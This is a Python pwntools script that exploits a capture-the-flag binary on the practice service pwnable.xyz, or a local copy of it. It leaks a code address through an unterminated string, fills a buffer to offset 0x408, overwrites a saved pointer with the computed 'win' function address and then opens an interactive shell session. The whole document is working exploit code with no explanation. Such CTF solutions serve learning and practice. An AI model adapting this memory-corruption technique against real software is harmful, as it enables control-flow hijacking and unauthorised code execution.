from pwn import *



def leak_win_addr():
    sh.sendafter('> ', '2')
    numb = sh.recvuntil("chars")[8:10]
    int_numb = int(numb)
    while (int_numb < 14):
        if (int_numb != 0):
            sh.sendafter(': ', '\x00')
        sh.sendafter('> ', '2')
        numb = sh.recvuntil("chars")[8:10]
        int_numb = int(numb)

    name = "A"*7 + "B"
    sh.sendafter(': ', name)
    sh.sendafter('> ', '3')
    sh.recvuntil("B")
    addr = u64(sh.recvline()[:-1].ljust(8, '\x00'))
    return addr - 0x6b 




debug = 1
if not debug:
    sh = remote('svc.pwnable.xyz', 30014)
else:
    sh = process('./challenge')
sh.sendafter('> ', '1')
name = "A"*0x7f
sh.sendafter(': ', name)
count = 0x7f


win_addr = leak_win_addr()
count += 14
while (count < 0x408):
    sh.sendafter('> ', '2')
    numb = sh.recvuntil("chars")[8:10]
    int_numb = int(numb)
    if (int_numb == 0):
        continue
    if (count + int_numb == 0x408):
        name = "B"*int_numb
        sh.sendafter(': ', name)
        count += int_numb
    elif (count + int_numb > 0x408):
        sh.sendafter(': ', '\x00')
        continue
    else: 
        name = "A"*(int_numb - 1) + "\x00"
        sh.sendafter(': ', name)
        count = count + int_numb - 1
        
        

sh.sendafter('> ', '2')
numb = sh.recvuntil("chars")[8:10]
int_numb = int(numb)

while (int_numb < 6):
    if (int_numb != 0):
        sh.sendafter(': ', '\x00')
    sh.sendafter('> ', '2')
    numb = sh.recvuntil("chars")[8:10]
    int_numb = int(numb)

name = p64(win_addr)
sh.sendafter(': ', name)
sh.sendafter('> ', '0')
sh.interactive()
